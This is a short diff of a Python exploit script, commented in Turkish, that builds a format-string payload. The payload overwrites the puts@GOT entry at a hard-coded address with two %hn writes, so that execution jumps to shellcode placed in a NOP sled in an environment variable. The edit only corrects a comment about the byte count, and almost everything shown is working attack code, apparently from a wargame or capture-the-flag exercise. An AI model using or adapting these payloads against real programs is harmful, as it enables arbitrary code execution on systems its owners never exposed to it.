@@ -39,7 +39,7 @@ egg = EGG_addr + 20000                     # sled ortası
 lh = egg & 0xffff; hh = (egg>>16) & 0xffff  # hh genelde 0xffff
 got = 0x0804b218
 payload  = pack(got) + pack(got+2)          # offset 1 ve 2'deki adresler
-payload += b'%.{lh-8}x%1$hn'                # puts@GOT = lh  (4+ (lh-8) = lh)
+payload += b'%.{lh-8}x%1$hn'                # puts@GOT = lh  (8 adres baytı + (lh-8) = lh)
 payload += b'%.{hh-lh}x%2$hn'               # puts@GOT+2 = hh
 # fgets stdin'den -> payload+"\n", bekle (printf ~64KB basar), puts->shellcode, timed komut
 ```
